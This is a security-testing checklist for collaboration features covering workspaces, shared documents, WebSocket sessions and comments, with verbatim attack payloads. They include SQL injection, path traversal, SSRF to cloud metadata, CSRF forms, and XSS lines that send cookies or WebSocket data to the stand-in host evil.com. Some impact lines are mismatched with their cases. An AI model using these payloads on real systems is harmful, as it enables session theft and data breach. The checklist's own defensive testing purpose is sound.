# 21. Collaboration Features — Checklist

Feature-area security **test cases** for “21. Collaboration Features”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*151 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## COLLAB-001 — IDOR on Team Workspace Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Login as a member of Workspace A. 2. Intercept the API request and change workspace_id to Workspace B. 3. Check if data from Workspace B is returned. 4. Try accessing workspace settings and members list of another workspace.

**Expected Result:** Application must verify that the authenticated user is a member of the requested workspace before granting any access.

**Payload Example:**

```
Change GET /api/workspaces/WS-1001/data to GET /api/workspaces/WS-2001/data with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-002 — Unauthorized Workspace Creation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. As a regular user without workspace creation privileges attempt to create a new workspace. 2. Access the workspace creation API endpoint directly. 3. Check if role-based restrictions are enforced on creation.

**Expected Result:** Application must restrict workspace creation to authorized users or plans and enforce licensing or plan limits on workspace count.

**Payload Example:**

```
POST /api/workspaces/create with regular user credentials or free-tier account exceeding workspace limits
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-003 — Workspace Deletion by Non-Owner
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Login as a workspace member with non-owner role. 2. Attempt to delete the workspace via API. 3. Modify role parameter or use admin endpoint. 4. Check if deletion is restricted to workspace owner.

**Expected Result:** Application must restrict workspace deletion to the workspace owner and require re-authentication before processing deletion.

**Payload Example:**

```
DELETE /api/workspaces/WS-1001 with member-role credentials;add role=owner to deletion request body
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-004 — Workspace Settings Modification by Non-Admin
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Login as a regular workspace member. 2. Intercept requests to workspace settings endpoints. 3. Attempt to modify workspace name or visibility or security policies. 4. Check if only admins can change settings.

**Expected Result:** Application must enforce role-based access control on all workspace settings modifications and restrict them to admin roles.

**Payload Example:**

```
PUT /api/workspaces/WS-1001/settings with member-role token;modify visibility=public or security_policy=none
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-005 — XSS in Workspace Name and Description
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Create or edit a workspace with XSS payload in the name and description fields. 2. Navigate to the workspace listing and detail pages. 3. Check if the payload executes for all workspace members. 4. Test in workspace switcher dropdown.

**Expected Result:** Application must sanitize all workspace metadata fields and encode output when rendering workspace names and descriptions.

**Payload Example:**

```
workspace_name=<script>alert(document.cookie)</script>;description=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-006 — SQL Injection in Workspace Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Use the workspace search functionality. 2. Inject SQL payloads in the search query parameter. 3. Test with UNION-based and boolean-based and time-based blind injection. 4. Observe responses for data leakage.

**Expected Result:** Application must use parameterized queries for all workspace search operations.

**Payload Example:**

```
GET /api/workspaces/search?q=' OR 1=1--;GET /api/workspaces?name=test' UNION SELECT email;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-007 — CSRF on Workspace Member Removal
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Craft a malicious page that auto-submits a request to remove a member from the workspace. 2. Lure the workspace admin to visit. 3. Check if the member is removed without CSRF token validation.

**Expected Result:** Application must validate anti-CSRF tokens on all workspace management operations including member removal.

**Payload Example:**

```
<form action='https://target.com/api/workspaces/WS-1001/members/USER-1002/remove' method='POST'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-008 — Workspace Data Isolation Failure
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Create data in Workspace A. 2. Switch to Workspace B. 3. Check if data from Workspace A is accessible or leaks into Workspace B. 4. Test cross-workspace API calls by manipulating workspace context.

**Expected Result:** Application must enforce strict data isolation between workspaces ensuring no data leakage across workspace boundaries.

**Payload Example:**

```
Access GET /api/workspaces/WS-2001/documents while in context of WS-1001;check response for cross-workspace data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-009 — Workspace Invitation Token Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Generate a workspace invitation link. 2. Decode and modify the invitation token. 3. Change the role from member to admin. 4. Change the workspace ID in the token. 5. Test expired token acceptance.

**Expected Result:** Application must use cryptographically signed invitation tokens with role binding and expiry that cannot be tampered with.

**Payload Example:**

```
Decode invitation token and change role=member to role=admin;change workspace_id;use expired token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool;Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-010 — Workspace Member Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Access workspace member endpoints. 2. Check if member details are exposed beyond what is necessary. 3. Attempt to enumerate members of workspaces the user is not part of. 4. Check for email and role exposure.

**Expected Result:** Application must restrict workspace member enumeration to workspace members only and minimize exposed member details.

**Payload Example:**

```
GET /api/workspaces/WS-2001/members with non-member credentials;check response for email;role;join_date;last_active
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COLLAB-011 — IDOR on Document Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Access own shared document. 2. Intercept and change document_id to another workspace's document. 3. Check if unauthorized documents are accessible. 4. Enumerate document IDs to discover accessible documents.

**Expected Result:** Application must verify that the authenticated user has permission to access each document within the correct workspace context.

**Payload Example:**

```
Change GET /api/documents/DOC-1001 to DOC-2001;enumerate GET /api/documents/DOC-0001 through DOC-9999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-012 — Stored XSS in Document Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Create or edit a shared document with XSS payload in the content body. 2. Include payloads in headings and paragraphs and embedded HTML. 3. Have another user open the document. 4. Check if script executes in their browser.

**Expected Result:** Application must sanitize all document content on input and encode on output to prevent stored XSS that affects all document viewers.

**Payload Example:**

```
document_content=<script>fetch('https://evil.com/?c='+document.cookie)</script>;heading=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-013 — Document Download Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Download a shared document. 2. Intercept the download request and modify the file path parameter. 3. Attempt directory traversal to read arbitrary server files. 4. Test with encoded traversal sequences.

**Expected Result:** Application must validate file paths and restrict download access to authorized document storage directories only.

**Payload Example:**

```
GET /api/documents/download?file=../../../etc/passwd;file=....//....//app/config/secrets.yml;file=%2e%2e%2f%2e%2e%2f
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## COLLAB-014 — Document Upload Malicious File
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Upload a document via the shared documents feature. 2. Attempt to upload web shells disguised as documents. 3. Upload polyglot files containing code. 4. Upload files with double extensions. 5. Check content type validation.

**Expected Result:** Application must validate uploaded files by content inspection and scan for malware and store files outside web root without execute permissions.

**Payload Example:**

```
Upload shell.php.docx;malware.exe.pdf;polyglot.jpg with embedded PHP;file.html with XSS;oversized_file.zip
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Files;ClamAV

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## COLLAB-015 — Document Sharing Link Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Create a document sharing link with view-only permission. 2. Intercept requests and modify permission parameters. 3. Attempt to edit or delete the document via the shared link. 4. Test if the link exposes direct edit API.

**Expected Result:** Application must enforce sharing link permissions server-side and restrict operations to the granted permission level.

**Payload Example:**

```
Modify shared link parameter from permission=view to permission=edit;call PUT /api/documents/DOC-1001 via shared link context
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-016 — Document Version History IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Access version history for own document. 2. Change document_id to access version history of another workspace's document. 3. Check if previous versions expose sensitive deleted content.

**Expected Result:** Application must verify document access permissions before displaying version history and apply consistent authorization across all versions.

**Payload Example:**

```
GET /api/documents/DOC-2001/versions with non-authorized credentials;access deleted content via version history
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-017 — SQL Injection in Document Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Use the document search functionality. 2. Inject SQL payloads in search parameters including full-text search. 3. Test with boolean-based and error-based techniques. 4. Check for search result data leakage.

**Expected Result:** Application must use parameterized queries for all document search operations including full-text search.

**Payload Example:**

```
GET /api/documents/search?q=' OR 1=1--;search=test' UNION SELECT content FROM documents WHERE id=2001--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-018 — Document Export SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. If document export allows embedding external resources test for SSRF. 2. Include image URLs pointing to internal services. 3. Use file:// protocol in document links. 4. Check PDF export for SSRF.

**Expected Result:** Application must validate all external resource URLs in documents and block access to internal network addresses during export.

**Payload Example:**

```
Embed <img src='http://169.254.169.254/latest/meta-data/'> in document content;use file:///etc/passwd in PDF export links
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COLLAB-019 — Document Concurrent Edit Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Open the same document in two browser sessions. 2. Make conflicting edits simultaneously. 3. Submit both edits at the same time. 4. Check for data loss or corruption. 5. Verify conflict resolution.

**Expected Result:** Application must handle concurrent document edits safely through operational transformation or CRDTs and never silently lose changes.

**Payload Example:**

```
Send concurrent PUT /api/documents/DOC-1001 with different content from two sessions simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## COLLAB-020 — Document Metadata Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Download or access document metadata. 2. Check for exposed author email and internal path and revision history. 3. Inspect document properties for system information. 4. Check EXIF data on embedded images.

**Expected Result:** Document metadata must not expose internal system paths or author personal details beyond what is necessary for collaboration.

**Payload Example:**

```
Inspect document properties for author_email;file_path;created_by_ip;internal_server_name;EXIF GPS coordinates in embedded images
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** ExifTool;Burp Suite;Document Properties Viewer

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-021 — WebSocket Authentication Bypass on Collaboration
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Capture the WebSocket connection for real-time collaboration. 2. Remove authentication tokens from the upgrade request. 3. Attempt to establish collaboration session without credentials. 4. Check if unauthenticated access is possible.

**Expected Result:** Application must authenticate WebSocket connections for collaboration during the handshake and reject unauthenticated upgrade requests.

**Payload Example:**

```
Connect to ws://target.com/collab/ws without session cookie or Authorization header;use expired token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;wscat;OWASP ZAP

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COLLAB-022 — Cross-Site WebSocket Hijacking (CSWSH) on Collaboration
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Create a malicious page that establishes a WebSocket connection to the collaboration endpoint using victim's cookies. 2. Lure authenticated victim to visit. 3. Monitor for collaboration data received. 4. Inject content via hijacked session.

**Expected Result:** Application must validate Origin header during WebSocket handshake and implement CSRF protection for collaboration WebSocket connections.

**Payload Example:**

```
<script>var ws=new WebSocket('wss://target.com/collab/ws');ws.onmessage=function(e){fetch('https://evil.com/?data='+encodeURIComponent(e.data))}</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Custom HTML;Browser;wscat

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-023 — Real-time Collaboration IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Join a collaboration session on own document. 2. Change the session_id or document_id in WebSocket messages. 3. Attempt to join another team's collaboration session. 4. Check for unauthorized data access.

**Expected Result:** Application must verify collaboration session membership before delivering any real-time updates to connected clients.

**Payload Example:**

```
Send {"join":"session_DOC-2001"} via WebSocket while only authorized for session_DOC-1001;change document_id in subscription
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-024 — Collaboration Message Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Send collaboration messages via WebSocket. 2. Inject XSS payloads in operation data. 3. Inject commands to modify other users' cursors or selections. 4. Test for operational transformation manipulation.

**Expected Result:** Application must validate and sanitize all collaboration messages before processing and broadcasting to prevent injection attacks.

**Payload Example:**

```
Send {"op":"insert",content:"<script>alert(1)</script>",position:0} via WebSocket;inject cursor manipulation commands
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-025 — Collaboration Session Eavesdropping
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Monitor WebSocket traffic during collaboration. 2. Check if all keystrokes and edits are transmitted in plaintext. 3. Verify encryption of collaboration data. 4. Check for sensitive data exposure in real-time sync.

**Expected Result:** Collaboration data must be encrypted in transit and WebSocket connections must use wss:// with no fallback to ws://.

**Payload Example:**

```
Monitor WebSocket messages for plaintext content;check for ws:// instead of wss://;inspect real-time edit deltas for sensitive data
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Wireshark;Burp Suite;wscat

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COLLAB-026 — Collaboration DoS via Message Flooding
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Establish collaboration WebSocket connection. 2. Send thousands of edit operations per second. 3. Send extremely large operation payloads. 4. Monitor impact on other collaborators. 5. Check for rate limiting.

**Expected Result:** Application must implement rate limiting on collaboration messages and maximum payload sizes to prevent denial of service for other collaborators.

**Payload Example:**

```
Send 10000 insert operations per second via WebSocket;send single operation with 10MB content payload
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** wscat;Custom Scripts;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COLLAB-027 — Collaboration Cursor and Presence Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Send collaboration presence messages. 2. Modify the user_id in cursor position messages. 3. Impersonate another user's cursor position. 4. Send fake typing indicators.

**Expected Result:** Application must determine user identity from the authenticated session and not accept client-provided user identifiers in collaboration messages.

**Payload Example:**

```
Send {"type":"cursor",user_id:"admin",position:{"line":1,col:1}} with regular user session via WebSocket
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-028 — Undo/Redo Manipulation in Collaboration
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Make edits in a collaborative session. 2. Intercept and manipulate undo/redo messages. 3. Attempt to undo other users' edits. 4. Send undo operations for changes made before joining.

**Expected Result:** Application must scope undo/redo operations to the initiating user and prevent users from undoing others' edits through message manipulation.

**Payload Example:**

```
Send {"op":"undo",target_user:"other_user",count:100} via WebSocket;undo operations from before session join
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-029 — Stored XSS in Comments
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Post a comment with XSS payload on a shared document or task. 2. Include payloads in comment body and reply and subject. 3. View the comment as another user. 4. Check if the script executes in viewer's browser.

**Expected Result:** Application must sanitize all comment content on input and encode on output to prevent stored XSS affecting all comment viewers.

**Payload Example:**

```
comment_body=<script>fetch('https://evil.com/?c='+document.cookie)</script>;reply=<img src=x onerror=alert(1)>;subject=<svg/onload=alert(document.domain)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-030 — Comment IDOR for Unauthorized Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Access comments on own document. 2. Change document_id or comment_id to access comments on another team's document. 3. Check if private comments from other workspaces are visible.

**Expected Result:** Application must verify that the authenticated user has access to the parent resource before displaying comments.

**Payload Example:**

```
GET /api/documents/DOC-2001/comments with non-member credentials;GET /api/comments/CMT-2001 from different workspace
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-031 — Comment Deletion by Non-Author
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Post a comment. 2. Login as another user in the same workspace. 3. Attempt to delete the first user's comment. 4. Check if only comment authors and admins can delete comments.

**Expected Result:** Application must restrict comment deletion to the comment author and workspace admins only.

**Payload Example:**

```
DELETE /api/comments/CMT-1001 with non-author non-admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-032 — Comment Edit by Non-Author
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Post a comment. 2. Login as another user. 3. Attempt to edit the comment via API. 4. Modify comment content to change the original meaning. 5. Check for edit history preservation.

**Expected Result:** Application must restrict comment editing to the original author and maintain edit history showing all modifications.

**Payload Example:**

```
PUT /api/comments/CMT-1001 with non-author credentials and modified content;check for edit_history preservation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-033 — SQL Injection in Comment Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Post a comment with SQL injection payloads in the body. 2. Search comments using SQL injection in the search parameter. 3. Observe responses for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all comment-related database operations.

**Payload Example:**

```
comment_body=Great work' OR 1=1--;GET /api/comments/search?q=test' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-034 — Annotation Position Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Create an annotation on a specific document location. 2. Intercept and modify the position coordinates. 3. Place annotation at negative or out-of-bounds coordinates. 4. Check for rendering issues or information disclosure.

**Expected Result:** Application must validate annotation positions within the document boundaries and handle invalid positions gracefully.

**Payload Example:**

```
Set annotation position to x=-9999;y=-9999 or x=99999999;y=99999999 in POST /api/annotations body
```

